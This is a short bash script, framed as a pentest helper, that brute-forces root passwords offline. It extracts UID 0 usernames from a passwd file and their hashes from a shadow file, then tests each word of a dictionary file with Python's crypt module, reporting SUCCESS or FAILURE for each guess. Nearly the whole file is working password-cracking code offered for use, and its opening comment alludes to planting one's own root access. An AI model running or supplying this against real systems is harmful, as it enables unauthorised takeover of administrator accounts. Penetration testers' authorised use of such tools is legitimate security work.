#!/bin/bash

# '...Because having persistent "legitimate" root access is not as "verbose" as adding your own pwned root'
# The script uses the Python crypt module to brute-force the root account password given the passwd and shadow files.
# It might prove useful if you are not having access to your pentest toolset and python is installed.


ROOT_UID=0

[[ "$#" -eq 3 ]] || { echo "[*] Usage : `basename $0` <passwd_file> <shadow_file> <dict_file>" && exit 1 ;}

for rootname in `sed -ne 's|^\([a-zA-Z0-9.\/@_-][a-zA-Z0-9.\/@_-]*\):[x!]:'$ROOT_UID'.*|\1|p' <"$1"`; do
	echo
	echo "[*] Found root account with username : $rootname "
	echo "[*] Starting brute force .."
	echo
 	
	printf '%-10s %-20s %-8s\n' 'RootName' 'Password' 'Result'
	printf '%-10s %-20s %-8s\n' '--------' '--------' '------'

	entry=`sed -ne 's|^'"$rootname"':\($[0-9]$[a-zA-Z0-9./][a-zA-Z0-9./]*$[a-zA-Z0-9./][a-zA-Z0-9./]*\):.*|\1|p' < "$2"`
	
	IFS='$' read -ra fields <<< `echo -n $entry `
	
	while IFS= read -r password || [ -n "$password" ] 
	do
		
		result=`python -c 'from crypt import crypt; print crypt( "'$password'"','"$'${fields[1]}'$'${fields[2]}'$")'`
		
		[[ "$entry" = "$result" ]] && \
			printf '%-10s %-20s \e[1;32m%-8s\e[m\n' "$rootname" "$password" "SUCCESS" && break ||\
		       		printf '%-10s %-20s \e[1;31m%-8s\e[m\n' "$rootname" "$password" "FAILURE"
		
	done < "$3"
	echo
	sleep 2s

done

exit 0

